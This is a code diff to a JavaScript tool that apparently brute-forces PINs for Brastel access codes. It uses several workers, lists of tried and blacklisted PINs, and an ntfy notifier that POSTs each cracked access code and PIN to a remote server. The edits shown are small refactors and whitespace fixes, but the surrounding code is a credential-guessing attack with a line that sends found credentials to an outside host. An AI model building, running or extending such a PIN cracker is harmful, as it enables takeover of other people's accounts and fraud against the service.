@@ -312,7 +312,8 @@ class FileManager {
    * @returns {boolean} True if already sent
    */
   isPinSent(pin) {
-    return this.cache.get('sentPins')?.has(pin) || false;
+    const sentPins = this.cache.get('sentPins');
+    return sentPins ? sentPins.has(pin) : false;
   }
 
   /**
@@ -342,7 +343,8 @@ class FileManager {
    * @returns {boolean} True if blacklisted
    */
   isBlacklisted(pin) {
-    return this.cache.get('blacklistPins')?.has(pin) || false;
+    const blacklistPins = this.cache.get('blacklistPins');
+    return blacklistPins ? blacklistPins.has(pin) : false;
   }
 
   /**
@@ -424,9 +426,11 @@ class FileManager {
 
   getStatistics() {
     const validNonBlacklisted = this.getValidNonBlacklistedPins();
+    const sentPins = this.cache.get('sentPins');
+    const blacklistPins = this.cache.get('blacklistPins');
     return {
-      sentPinsCount: this.cache.get('sentPins')?.size || 0,
-      blacklistPinsCount: this.cache.get('blacklistPins')?.size || 0,
+      sentPinsCount: sentPins ? sentPins.size : 0,
+      blacklistPinsCount: blacklistPins ? blacklistPins.size : 0,
       validPinsCount: this.getValidPins().length,
       validNonBlacklistedCount: validNonBlacklisted.length,
       blacklistedPins: this.getBlacklistPins(),
@@ -643,14 +647,14 @@ class PinChecker {
       // Valid PIN found
       this.logger.found(`Worker ${workerId} - FOUND VALID PIN: ${pin}`);
       this.fileManager.addValidPin(pin);
-      
+
       // Send ntfy notification
       try {
         await this.ntfyNotifier.sendPinFoundNotification(this.accessCode, pin, workerId);
       } catch (error) {
         this.logger.error(`Failed to send ntfy notification: ${error.message}`);
       }
-      
+
       this.found = true;
       return true;
     }
@@ -1082,10 +1086,10 @@ class NtfyNotifier {
 
     try {
       const url = `${this.server}/${this.topic}`;
-      
+
       // Sanitize title for HTTP header
       const sanitizedTitle = this.sanitizeHeader(title);
-      
+
       const response = await fetch(url, {
         method: 'POST',
         headers: {
@@ -1119,7 +1123,7 @@ class NtfyNotifier {
   async sendPinFoundNotification(accessCode, pin, workerId) {
     const title = 'Brastel PIN Found!'; // Removed emoji from title
     const message = `🎯 Brastel PIN Found!\n\nAccess Code: ${accessCode}\nPIN: ${pin}\nWorker: ${workerId}\nTime: ${new Date().toLocaleString()}`;
-    
+
     return await this.sendNotification(title, message, '5'); // High priority
   }
 }
